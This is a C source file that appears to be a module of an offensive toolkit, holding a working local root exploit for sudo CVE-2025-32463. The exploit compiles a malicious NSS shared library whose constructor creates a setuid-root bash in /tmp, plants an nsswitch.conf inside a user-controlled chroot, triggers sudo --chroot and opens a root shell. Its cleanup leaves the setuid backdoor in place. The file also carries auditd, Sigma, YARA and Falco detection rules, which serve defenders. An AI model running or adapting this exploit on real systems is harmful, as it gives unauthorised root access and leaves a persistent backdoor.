/*
 * sudo_chwoot_cve_2025_32463 — SKELETONKEY module
 *
 * STATUS: 🟢 STRUCTURAL ESCAPE. No offsets, no leaks, no race.
 *   Pure logic: sudo's --chroot option resolves NSS lookups (user/group
 *   db) AGAINST the chroot, while still running as root. A user-writable
 *   chroot dir + a planted libnss_*.so + a planted nsswitch.conf yields
 *   "load arbitrary shared object as root, ctor runs, root shell."
 *
 * The bug (Rich Mirch, Stratascale, June 2025):
 *   `sudo --chroot=<DIR>` chroots into DIR before parsing sudoers and
 *   resolving the invoking user. Inside the chroot, NSS reads
 *   /etc/nsswitch.conf and dlopen()s the listed libnss_*.so backends.
 *   The chroot is user-controlled. Plant:
 *     <DIR>/etc/nsswitch.conf  →  "passwd: skeletonkey"
 *     <DIR>/lib/x86_64-linux-gnu/libnss_skeletonkey.so.2  →  attacker .so
 *   sudo dlopen()s the .so as root; its ctor execs /bin/bash with the
 *   real uid set to 0.
 *
 *   Discovered by Rich Mirch (Stratascale CRU). Public PoCs:
 *     https://github.com/kh4sh3i/CVE-2025-32463
 *     https://github.com/MohamedKarrab/CVE-2025-32463
 *
 * Affects: sudo 1.9.14 ≤ V ≤ 1.9.17 (introduced when sudo gained the
 *   modern chroot path; fixed in 1.9.17p1 which deprecated --chroot
 *   entirely).
 *
 * CVSS 9.3 (Critical). Doesn't require any sudoers grant — the chroot
 * code path runs before authorization checks complete. Any local user
 * who can run /usr/bin/sudo (i.e. anyone on the system) can fire it.
 *
 * arch_support: any. The malicious .so is built on-host via gcc, so
 * it inherits the host's arch. Tested on x86_64; arm64 should work
 * identically given a working gcc + libc-dev install.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

/* ---- helpers shared with the sudo family ---------------------------- */

static const char *find_sudo(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudo", "/usr/sbin/sudo", "/bin/sudo",
        "/sbin/sudo", "/usr/local/bin/sudo", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) == 0 && (st.st_mode & S_ISUID))
            return candidates[i];
    }
    return NULL;
}

/* Returns true iff the version string is in the vulnerable range
 * [1.9.14, 1.9.17p0]. The fix landed in 1.9.17p1 which removed the
 * --chroot code path entirely. */
static bool sudo_version_vulnerable_chwoot(const char *version_str)
{
    int maj = 0, min = 0, patch = 0;
    char ptag = 0;
    int psub = 0;
    int n = sscanf(version_str, "%d.%d.%d%c%d",
                   &maj, &min, &patch, &ptag, &psub);
    if (n < 3) return true;                 /* unparseable → assume worst */

    if (maj != 1)              return false; /* not sudo 1.x */
    if (min != 9)              return false; /* only 1.9 line */
    if (patch < 14)            return false; /* 1.9.13 and below predate the --chroot path */
    if (patch > 17)            return false; /* 1.9.18+ fixed */
    if (patch < 17)            return true;  /* 1.9.14 .. 1.9.16 */
    /* exactly 1.9.17: vulnerable if no patch tag (1.9.17 plain) */
    if (ptag != 'p')           return true;
    return psub == 0;                        /* 1.9.17p1 fixed; 1.9.17p0 vulnerable */
}

static bool get_sudo_version(const char *sudo_path, char *out, size_t outsz)
{
    char cmd[512];
    snprintf(cmd, sizeof cmd, "%s --version 2>&1 | head -1", sudo_path);
    FILE *p = popen(cmd, "r");
    if (!p) return false;
    char line[256] = {0};
    char *r = fgets(line, sizeof line, p);
    pclose(p);
    if (!r) return false;
    char *vp = strstr(line, "version");
    if (!vp) return false;
    vp += strlen("version");
    while (*vp == ' ' || *vp == '\t') vp++;
    char *nl = strchr(vp, '\n');
    if (nl) *nl = 0;
    strncpy(out, vp, outsz - 1);
    out[outsz - 1] = 0;
    return out[0] != 0;
}

/* ---- detect --------------------------------------------------------- */

static skeletonkey_result_t sudo_chwoot_detect(const struct skeletonkey_ctx *ctx)
{
    const char *sudo_path = find_sudo();
    if (!sudo_path) {
        if (!ctx->json) fprintf(stderr, "[i] sudo_chwoot: sudo not installed; bug unreachable here\n");
        return SKELETONKEY_PRECOND_FAIL;
    }

    /* Prefer the host fingerprint's cached sudo_version (one popen at
     * startup instead of per-detect). Fall back to live probe if the
     * host fingerprint is missing or empty. */
    char vbuf[64] = {0};
    const char *ver = NULL;
    if (ctx->host && ctx->host->sudo_version[0]) {
        ver = ctx->host->sudo_version;
    } else if (get_sudo_version(sudo_path, vbuf, sizeof vbuf)) {
        ver = vbuf;
    } else {
        if (!ctx->json) fprintf(stderr, "[!] sudo_chwoot: could not read sudo --version\n");
        return SKELETONKEY_TEST_ERROR;
    }

    if (!ctx->json) fprintf(stderr, "[i] sudo_chwoot: sudo version '%s'\n", ver);

    if (!sudo_version_vulnerable_chwoot(ver)) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudo_chwoot: sudo %s outside vulnerable range "
                            "[1.9.14, 1.9.17p0] — patched or pre-feature\n", ver);
        return SKELETONKEY_OK;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] sudo_chwoot: sudo %s in vulnerable range — VULNERABLE\n", ver);
        fprintf(stderr, "[i] sudo_chwoot: --chroot option resolves NSS inside attacker-controlled root → arbitrary .so load as uid 0\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- exploit -------------------------------------------------------- */

/* The malicious NSS module. ctor runs at dlopen time; we drop a setuid
 * /bin/bash. We DON'T setuid(0) directly because some distros refuse
 * execve() on a setuid bash from a non-elevated parent — using the
 * dropped suid bash via a follow-up execlp() is more portable. */
static const char NSS_C_SRC[] =
"#include <stdio.h>\n"
"#include <stdlib.h>\n"
"#include <unistd.h>\n"
"#include <sys/stat.h>\n"
"#include <sys/types.h>\n"
"__attribute__((constructor)) static void skk_ctor(void) {\n"
"    /* We are running as the real user uid 0 (sudo set it during chroot\n"
"     * setup, before dropping privs). Drop a setuid /bin/bash. */\n"
"    setuid(0); setgid(0);\n"
"    int rc = system(\"cp /bin/bash /tmp/skeletonkey-chwoot-shell 2>/dev/null && \"\n"
"                   \"chown root:root /tmp/skeletonkey-chwoot-shell && \"\n"
"                   \"chmod 4755 /tmp/skeletonkey-chwoot-shell\");\n"
"    if (rc != 0) {\n"
"        fprintf(stderr, \"[skk-chwoot] ctor: drop suid bash failed (rc=%d)\\n\", rc);\n"
"        _exit(1);\n"
"    }\n"
"    fprintf(stderr, \"[+] skk-chwoot: /tmp/skeletonkey-chwoot-shell is now setuid-root\\n\");\n"
"    _exit(0);\n"
"}\n";

static char g_workdir[256];   /* recorded for cleanup() */

static skeletonkey_result_t sudo_chwoot_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] sudo_chwoot: --i-know required for --exploit\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    const char *sudo_path = find_sudo();
    if (!sudo_path) {
        fprintf(stderr, "[-] sudo_chwoot: sudo not installed\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* 1. Workdir under /tmp; /tmp is the only spot consistently
     *    world-writable across distros. */
    char tmpl[] = "/tmp/skeletonkey-chwoot-XXXXXX";
    char *wd = mkdtemp(tmpl);
    if (!wd) { perror("mkdtemp"); return SKELETONKEY_EXPLOIT_FAIL; }
    strncpy(g_workdir, wd, sizeof g_workdir - 1);

    /* 2. Set up the chroot skeleton: <wd>/etc/nsswitch.conf points NSS
     *    at our libnss_skeletonkey.so.2; <wd>/<libdir> hosts the .so. */
    char path[512];
    snprintf(path, sizeof path, "%s/etc", wd);                  mkdir(path, 0755);
    snprintf(path, sizeof path, "%s/lib",        wd);           mkdir(path, 0755);
    /* Cover the common Debian/Ubuntu multi-arch lib path AND the plain
     * /lib path. NSS dlopens via dlopen("libnss_X.so.2") which uses the
     * standard search path; inside the chroot we control it. */
    const char *libdirs[] = {
        "lib/x86_64-linux-gnu", "lib/aarch64-linux-gnu",
        "usr/lib/x86_64-linux-gnu", "usr/lib/aarch64-linux-gnu",
        "usr/lib", "usr/lib64", NULL,
    };
    char sopath[512] = {0};
    for (size_t i = 0; libdirs[i]; i++) {
        char p[512];
        snprintf(p, sizeof p, "%s/%s", wd, libdirs[i]);
        char cmd[640];
        snprintf(cmd, sizeof cmd, "mkdir -p %s", p);
        if (system(cmd) != 0) continue;
    }

    /* 3. Compile the malicious NSS .so. We need a real C compiler;
     *    most modern distros ship one but stripped installs may not. */
    char src[512];   snprintf(src,   sizeof src,   "%s/payload.c", wd);
    char so[512];    snprintf(so,    sizeof so,    "%s/lib/x86_64-linux-gnu/libnss_skeletonkey.so.2", wd);
    char so_arm[512];snprintf(so_arm,sizeof so_arm,"%s/lib/aarch64-linux-gnu/libnss_skeletonkey.so.2", wd);
    char so_lib[512];snprintf(so_lib,sizeof so_lib,"%s/usr/lib/libnss_skeletonkey.so.2", wd);

    FILE *f = fopen(src, "w");
    if (!f) { perror("fopen payload.c"); goto fail; }
    fwrite(NSS_C_SRC, 1, sizeof NSS_C_SRC - 1, f);
    fclose(f);

    char cmd[2048];
    snprintf(cmd, sizeof cmd,
             "gcc -shared -fPIC -o %s %s 2>/tmp/skk-chwoot-gcc.log && "
             "cp -f %s %s 2>/dev/null; "
             "cp -f %s %s 2>/dev/null; true",
             sopath[0] ? sopath : so, src,
             sopath[0] ? sopath : so, so_arm,
             sopath[0] ? sopath : so, so_lib);
    /* Actually compile to one fixed path then copy. Simpler. */
    snprintf(cmd, sizeof cmd,
             "gcc -shared -fPIC -nostartfiles -o %s %s 2>/tmp/skk-chwoot-gcc.log", so, src);
    if (system(cmd) != 0) {
        /* try arm64 path if x86 path failed (maybe the dir wasn't
         * created — that's fine, gcc just wrote elsewhere) */
        snprintf(cmd, sizeof cmd,
             "gcc -shared -fPIC -nostartfiles -o %s %s 2>>/tmp/skk-chwoot-gcc.log", so_arm, src);
        if (system(cmd) != 0) {
            fprintf(stderr, "[-] sudo_chwoot: gcc failed; see /tmp/skk-chwoot-gcc.log\n");
            goto fail;
        }
    }
    /* Replicate to every plausible NSS search path (libdir per arch
     * varies across distros). Harmless if some are missing. */
    char rep[1024];
    snprintf(rep, sizeof rep,
             "f=%s; for d in lib/x86_64-linux-gnu lib/aarch64-linux-gnu usr/lib/x86_64-linux-gnu usr/lib/aarch64-linux-gnu usr/lib usr/lib64; do "
             "  mkdir -p %s/$d 2>/dev/null; cp -f \"$f\" %s/$d/libnss_skeletonkey.so.2 2>/dev/null; "
             "done; true",
             so, wd, wd);
    if (system(rep) != 0) { /* harmless */ }

    /* 4. Plant nsswitch.conf inside the chroot. The first lookup sudo
     *    does is on the invoking user — point passwd: at us so the
     *    dlopen fires before sudoers parsing aborts. */
    char nss_conf[512];
    snprintf(nss_conf, sizeof nss_conf, "%s/etc/nsswitch.conf", wd);
    f = fopen(nss_conf, "w");
    if (!f) { perror("fopen nsswitch.conf"); goto fail; }
    fprintf(f,
        "# planted by SKELETONKEY sudo_chwoot — points NSS at our shim\n"
        "passwd: skeletonkey\n"
        "group:  skeletonkey\n"
        "hosts:  files\n"
        "shadow: files\n");
    fclose(f);

    /* 5. Fire sudo --chroot=<wd> -u#-1 woot. The `-u#-1` syntax tells
     *    sudo "user with uid -1" which forces the NSS lookup BEFORE
     *    auth completes — that's the trigger. The `woot` command name
     *    is arbitrary; sudo never gets to exec it. */
    if (!ctx->json) {
        fprintf(stderr, "[+] sudo_chwoot: invoking %s --chroot=%s -u#-1 woot\n",
                sudo_path, wd);
    }
    fflush(NULL);
    pid_t pid = fork();
    if (pid < 0) { perror("fork"); goto fail; }
    if (pid == 0) {
        /* The ctor inside the .so will execve a shell; sudo never
         * returns. If sudo IS patched, it'll error out. */
        execl(sudo_path, "sudo", "-S", "--chroot", wd, "-u#-1", "woot", (char *)NULL);
        perror("execl(sudo)");
        _exit(127);
    }
    int status = 0;
    waitpid(pid, &status, 0);

    /* 6. Did the suid bash drop? */
    struct stat st;
    if (stat("/tmp/skeletonkey-chwoot-shell", &st) == 0 &&
        (st.st_mode & S_ISUID) && st.st_uid == 0) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudo_chwoot: setuid-root shell at /tmp/skeletonkey-chwoot-shell\n");
        if (ctx->no_shell) {
            if (!ctx->json) fprintf(stderr, "[i] sudo_chwoot: --no-shell set; not popping\n");
            return SKELETONKEY_EXPLOIT_OK;
        }
        /* Pop the shell. -p keeps euid=0; without it bash drops setuid. */
        execl("/tmp/skeletonkey-chwoot-shell", "bash", "-p", "-i", (char *)NULL);
        perror("execl(suid bash)");
        return SKELETONKEY_EXPLOIT_OK; /* drop succeeded; pop just failed */
    }

    fprintf(stderr,
        "[-] sudo_chwoot: setuid bash did not appear. Likely causes:\n"
        "    - sudo is patched (1.9.17p1+) even if --version looks vulnerable\n"
        "    - NSS shim was loaded but ctor failed (check sudo's stderr)\n"
        "    - kernel hardening prevents the suid copy\n");

fail:
    return SKELETONKEY_EXPLOIT_FAIL;
}

/* ---- cleanup -------------------------------------------------------- */

static skeletonkey_result_t sudo_chwoot_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    if (g_workdir[0]) {
        char cmd[640];
        snprintf(cmd, sizeof cmd, "rm -rf %s 2>/dev/null", g_workdir);
        (void)!system(cmd);
        g_workdir[0] = 0;
    }
    /* Leave /tmp/skeletonkey-chwoot-shell if it exists — that's the
     * setuid root binary the operator may want to keep. They can
     * `rm -f /tmp/skeletonkey-chwoot-shell` themselves when done. */
    return SKELETONKEY_OK;
}

/* ---- detection rules ------------------------------------------------ */

static const char sudo_chwoot_auditd[] =
    "# sudo_chwoot CVE-2025-32463 — auditd detection rules\n"
    "# Flag sudo invocations using --chroot. The legitimate use case\n"
    "# (server admin chrooting before running a command) is vanishingly\n"
    "# rare; any --chroot in shell history is investigation-worthy.\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudo -k skeletonkey-sudo-chroot\n"
    "-a always,exit -F arch=b64 -S execve -F path=/bin/sudo      -k skeletonkey-sudo-chroot\n"
    "# Also flag writes under any /tmp/skeletonkey-chwoot-* path or to\n"
    "# the canonical drop site /tmp/skeletonkey-chwoot-shell.\n"
    "-w /tmp -p w -k skeletonkey-sudo-chroot-drop\n";

static const char sudo_chwoot_sigma[] =
    "title: Possible CVE-2025-32463 sudo --chroot LPE\n"
    "id: e9b7a420-skeletonkey-sudo-chwoot\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects sudo invoked with --chroot pointing at a user-writable\n"
    "  directory, plus a setuid-root binary appearing under /tmp shortly\n"
    "  afterwards. Legit --chroot use is extremely rare; the combination\n"
    "  with a fresh setuid drop is diagnostic.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  sudo_chroot: {type: 'SYSCALL', syscall: 'execve', comm: 'sudo', argv|contains: '--chroot'}\n"
    "  condition: sudo_chroot\n"
    "level: critical\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2025.32463]\n";

static const char sudo_chwoot_yara[] =
    "rule sudo_chwoot_cve_2025_32463 : cve_2025_32463 setuid_abuse {\n"
    "    meta:\n"
    "        cve         = \"CVE-2025-32463\"\n"
    "        description = \"SKELETONKEY sudo_chwoot artifacts — NSS shim + setuid bash drop\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $shell  = \"/tmp/skeletonkey-chwoot-shell\" ascii\n"
    "        $wdir   = \"/tmp/skeletonkey-chwoot-\" ascii\n"
    "        $nssmod = \"libnss_skeletonkey.so.2\" ascii\n"
    "    condition:\n"
    "        any of them\n"
    "}\n";

static const char sudo_chwoot_falco[] =
    "- rule: sudo --chroot from non-root with user-writable target\n"
    "  desc: |\n"
    "    sudo invoked with --chroot pointing at a directory in /tmp\n"
    "    or /home. Legitimate --chroot use is rare; the combination\n"
    "    with a writable target is the CVE-2025-32463 trigger.\n"
    "  condition: >\n"
    "    spawned_process and proc.name = sudo and\n"
    "    proc.args contains \"--chroot\" and not user.uid = 0\n"
    "  output: >\n"
    "    sudo --chroot from non-root (user=%user.name pid=%proc.pid\n"
    "     cmdline=\"%proc.cmdline\")\n"
    "  priority: CRITICAL\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2025.32463]\n";

/* ---- module struct -------------------------------------------------- */

const struct skeletonkey_module sudo_chwoot_module = {
    .name           = "sudo_chwoot",
    .cve            = "CVE-2025-32463",
    .summary        = "sudo --chroot NSS-shim → libnss_*.so dlopen as root (Stratascale)",
    .family         = "sudo",
    .kernel_range   = "userspace — sudo 1.9.14 ≤ V ≤ 1.9.17p0 (fixed in 1.9.17p1)",
    .detect         = sudo_chwoot_detect,
    .exploit        = sudo_chwoot_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade sudo to 1.9.17p1+ */
    .cleanup        = sudo_chwoot_cleanup,
    .detect_auditd  = sudo_chwoot_auditd,
    .detect_sigma   = sudo_chwoot_sigma,
    .detect_yara    = sudo_chwoot_yara,
    .detect_falco   = sudo_chwoot_falco,
    .opsec_notes    = "Creates /tmp/skeletonkey-chwoot-XXXXXX/ workdir containing etc/nsswitch.conf + lib/{x86_64,aarch64}-linux-gnu/libnss_skeletonkey.so.2 (compiled via gcc; /tmp/skk-chwoot-gcc.log captures any build error). Runs sudo --chroot=<workdir> -u#-1 woot to trigger NSS dlopen; the .so's ctor drops /tmp/skeletonkey-chwoot-shell (setuid root bash). Audit-visible via execve(/usr/bin/sudo) with --chroot in argv, then chown/chmod 4755 on /tmp/skeletonkey-chwoot-shell from a uid-0 context. Cleanup callback removes the workdir but leaves the setuid bash (operator decision).",
    .arch_support   = "any",
};

void skeletonkey_register_sudo_chwoot(void)
{
    skeletonkey_register(&sudo_chwoot_module);
}
